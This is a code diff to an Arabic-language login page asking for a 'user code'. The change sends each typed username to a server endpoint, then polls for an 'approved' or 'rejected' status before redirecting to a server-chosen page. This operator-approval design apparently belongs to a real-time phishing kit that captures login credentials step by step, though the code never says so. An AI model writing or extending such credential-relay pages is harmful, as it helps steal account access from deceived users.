@@ -43,7 +43,7 @@
         <h1 class="page-heading">كود المستخدم</h1>
 
         <section class="login-card">
-            <div id="errorMessage" role="alert"></div>
+            <div id="errorMessage" role="alert" style="display:none; color: red; margin-bottom: 10px;"></div>
             <form id="step1Form">
                 <div class="form-group">
                     <label class="form-label">كود المستخدم</label>
@@ -53,7 +53,7 @@
                 </div>
                 <a href="#" class="forgot-link">نسيت كود المستخدم؟</a>
                 
-                <button type="submit" class="submit-btn">تسجيل الدخول</button>
+                <button type="submit" class="submit-btn" id="submitBtn">تسجيل الدخول</button>
             </form>
         </section>
 
@@ -73,11 +73,48 @@ function toggleUserType(element) {
 document.getElementById('step1Form').addEventListener('submit', function(event) {
     event.preventDefault();
     const username = document.getElementById('username').value;
-    if (username) {
-        localStorage.setItem('temp_username', username);
-        window.location.href = 'password.html';
-    }
+    const btn = document.getElementById('submitBtn');
+    
+    btn.disabled = true;
+    btn.innerText = "جاري المعالجة...";
+
+    fetch('/submit_request', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            type: 'username',
+            data: { username: username }
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.request_id) {
+            pollStatus(data.request_id);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        btn.disabled = false;
+        btn.innerText = "تسجيل الدخول";
+    });
 });
+
+function pollStatus(requestId) {
+    const interval = setInterval(() => {
+        fetch('/request_status/' + requestId)
+        .then(res => res.json())
+        .then(data => {
+            if (data.status === 'approved') {
+                clearInterval(interval);
+                window.location.href = data.redirect_to || 'password.html';
+            } else if (data.status === 'rejected') {
+                clearInterval(interval);
+                alert('تم رفض الطلب، يرجى المحاولة مرة أخرى');
+                window.location.reload();
+            }
+        });
+    }, 2000);
+}
 </script>
 </body>
 </html>
